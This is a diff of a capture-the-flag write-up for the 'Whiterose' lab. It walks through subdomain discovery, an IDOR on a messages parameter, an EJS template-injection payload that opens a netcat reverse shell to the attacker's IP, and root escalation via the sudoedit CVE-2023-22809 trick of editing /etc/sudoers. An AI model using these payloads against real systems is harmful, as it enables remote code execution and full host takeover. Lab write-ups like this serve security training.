@@ -1,5 +1,6 @@
 # Whiterose
 
+#Linux #PrivEsc #WebExploitation #nodejs #LFI #SSTI #CVE-2023-22809
 ## Recon
 
 I started running nmap and I got the result:
@@ -27,7 +28,7 @@ Nmap done: 1 IP address (1 host up) scanned in 13.40 seconds
 
 I tried to find some files and directories in `cyprusbank.thm` but I didn't find anything interesting. 
 
-<figure><img src="internal-1.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="whiterose-1.png" alt=""><figcaption></figcaption></figure>
 
 After that I tried to find subdomains.
 
@@ -63,21 +64,79 @@ www                     [Status: 200, Size: 252, Words: 19, Lines: 9, Duration: 
 
 ```
 
+It's important to add the subdomain in the `/etc/hosts` file.
 
+<figure><img src="whiterose-2.png" alt=""><figcaption></figcaption></figure>
 
 ## Exploiting
 
-```
-10.66.128.105   cyprusbank.thm  admin.cyprusbank.thm
-```
+We were given these credentials to log in: Olivia Cortez:olivi8
+
+<figure><img src="whiterose-3.png" alt=""><figcaption></figcaption></figure>
+
+Once logged into the application, I searched for any possible attack vector.
 
 
-```
-Gayle Bev: 'p~]P@5!6;rs558:q'
-```
+<figure><img src="whiterose-4.png" alt=""><figcaption></figcaption></figure>
+
+There is a `c` parameter in the `/messages` page, I managed to find some previous messages changing this parameter.
+
+<figure><img src="whiterose-5.png" alt=""><figcaption></figcaption></figure>
+
+I was able to login as Gayle Bev user. I can now access the Settings page that I couldn't access before.
+
+<figure><img src="whiterose-6.png" alt=""><figcaption></figcaption></figure>
+
+This page allows you to change any user's password (but it does not work). Probably there is a XSS or SSTI, because the password field is reflected.
+
+<figure><img src="whiterose-7.png" alt=""><figcaption></figcaption></figure>
+
+If I send just the name field, the application returns an error that indicates that the application is using EJS (*EJS (Embedded JavaScript Templates) is a template language for Node.js that allows you to embed JavaScript code directly into HTML files*).
+
+In searching for SSTI payloads, I found the following source:
+
+{% embed url="https://eslam.io/posts/ejs-server-side-template-injection-rce/"%}
+
+
+<figure><img src="whiterose-8.png" alt=""><figcaption></figcaption></figure>
+
+First I tried to connect to my localhost on port 1337 and it worked!
+
+After that, I tried some reverse shells and this one worked for me:
 
 ```
 name=test&password=123&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc 192.168.130.101 1337 -e sh');s
 ```
 
-https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudoedit-privilege-escalation
+<figure><img src="whiterose-9.png" alt=""><figcaption></figcaption></figure>
+
+## Privilege Escalation
+
+First of all, I ran a `sudo -l` and I noticed that I could run `sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm` as root without a password.
+
+<figure><img src="whiterose-10.png" alt=""><figcaption></figcaption></figure>
+
+While searching for vulnerabilities in the `sudoedit` (version `1.9.12p1`) I found the `CVE-2023-22809` vulnerability which is explained in the first link below, we can see more details in the second link.
+
+{% embed url="https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf%}
+
+{% embed url="https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudoedit-privilege-escalation"%}
+
+In short, sudoedit allows us to choose which editor we want to use by passing some of these environment variables: **SUDO_EDITOR**, **VISUAL**, or **EDITOR**. By using `--` argument, we can force it to open different files that are allowed in the `sudoedit` command but that we don't have privileges to access. This way, we can run `sudoedit` as root and edit any file as root.
+
+```
+export EDITOR="vim -- /etc/sudoers"
+sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
+```
+
+I will modify the `/etc/sudoers` file to give my user access to execute commands as sudo without needing a password. I just need to add this line below:
+
+```
+web ALL=(root) NOPASSWD: ALL
+```
+
+<figure><img src="whiterose-11.png" alt=""><figcaption></figcaption></figure>
+
+It's done! I was able to elevate my privilege to root.
+
+<figure><img src="whiterose-12.png" alt=""><figcaption></figcaption></figure>
